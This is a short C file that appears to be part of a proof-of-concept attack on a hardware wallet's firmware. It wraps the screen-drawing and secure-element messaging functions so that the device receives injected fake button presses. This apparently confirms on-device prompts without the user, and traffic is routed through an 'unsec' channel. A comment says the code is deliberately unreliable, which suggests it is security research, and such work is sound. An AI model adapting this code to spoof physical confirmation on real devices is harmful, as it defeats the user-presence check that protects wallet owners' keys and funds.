#include <stdint.h>

#include "unsec.h"
#include "util.h"

void TEXT(memcpy) _wrap_bagl_draw_with_context(void *component, void *context, uint16_t context_length, uint8_t context_encoding) {
    static const RODATA(memcpy) uint8_t buffer_release[] = { SEPROXYHAL_TAG_BUTTON_PUSH_EVENT, 0, 1, (0 << 1) };
    static const RODATA(memcpy) uint8_t buffer_press[]   = { SEPROXYHAL_TAG_BUTTON_PUSH_EVENT, 0, 1, (3 << 1) };

    static uint32_t i = 0;

    if (i < 2) {
        /* This is intentionally unreliable to avoid weaponization */

        i++;

        _real_io_seproxyhal_send(buffer_press, sizeof(buffer_press));
        _real_HAL_Delay(SEPROXYHAL_TAG_BUTTON_PUSH_INTERVAL_MS);

        _real_io_seproxyhal_send(buffer_release, sizeof(buffer_release));
        _real_HAL_Delay(SEPROXYHAL_TAG_BUTTON_PUSH_INTERVAL_MS);
    }

    _real_bagl_draw_with_context(component, context, context_length, context_encoding);
}

void TEXT(udivsi3) _wrap_io_seproxyhal_send(const uint8_t *buffer, uint16_t length) {
    io_seproxyhal_unsec_chunk(buffer, length);
}
